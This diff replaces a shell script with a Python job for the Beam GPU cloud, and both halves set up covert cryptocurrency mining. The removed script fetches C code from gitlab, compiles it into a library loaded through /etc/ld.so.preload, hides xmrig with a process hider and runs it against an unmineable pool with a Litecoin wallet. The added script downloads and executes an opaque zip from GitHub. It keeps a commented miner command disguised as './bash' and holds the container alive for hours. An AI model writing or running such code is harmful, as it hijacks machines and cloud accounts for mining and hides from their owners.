@@ -1,17 +1,67 @@
-#!/bin/sh
-sudo apt update
-sudo apt install screen -y
-apt-get update ; apt-get install sudo -y
-curl https://gitlab.com/liugtiujk/portal/-/raw/master/cikblek.c -o cikblek.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libcikblek.so cikblek.c -ldl
-mv libcikblek.so /usr/local/lib/
-echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
-rm cikblek.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
-sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add xmrig"
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz >/dev/null 2>&1
-tar -xf xmrig-6.17.0-linux-x64.tar.gz
-cd xmrig-6.17.0
-./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."0$RANDOM" >/dev/null 2>&1 &
+from beam import function, Image
+import subprocess
+import time
+
+image = (
+    Image(
+        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
+    )
+    .add_commands([
+        "apt-get update -y",
+        "apt-get install -y curl ca-certificates unzip git",
+    ])
+)
+
+
+@function(
+    name="t4x3-runner",
+    image=image,
+    gpu="RTX5090",
+    cpu=4,
+    memory="8Gi",
+    timeout=4 * 60 * 60,
+)
+def run_script():
+    # cek GPU
+    subprocess.run(["nvidia-smi"], check=False)
+
+    cmd = """
+    set -e
+
+    echo "=== DOWNLOAD FILE ==="
+    curl -sL -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
+
+    echo "=== CHECK DOWNLOAD ==="
+    ls -lh /tmp/pan.zip
+
+    echo "=== EXTRACT ==="
+    mkdir -p /tmp/work
+    unzip -o /tmp/pan.zip -d /tmp/work
+
+    echo "=== SET PERMISSION ==="
+    chmod -R +x /tmp/work
+
+    echo "=== WORKLOAD START ==="
+
+    # =====================================================
+    # ./graftcp/graftcp ./bash --algo ethash --pool stratum+tcp://ethash.unmineable.com:3333 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.kacung --ethstratum ETHPROX
+    # =====================================================
+
+
+    # =====================================================
+    # SELESAI
+    # =====================================================
+
+    echo "=== WORKLOAD FINISHED ==="
+    """
+
+    result = subprocess.run(
+        ["bash", "-lc", cmd],
+        check=False,
+    )
+
+    print("Process exited with:", result.returncode)
+
+    # Untuk pengujian saja:
+    print("Keeping the container alive...")
+    time.sleep(4 * 60 * 60)
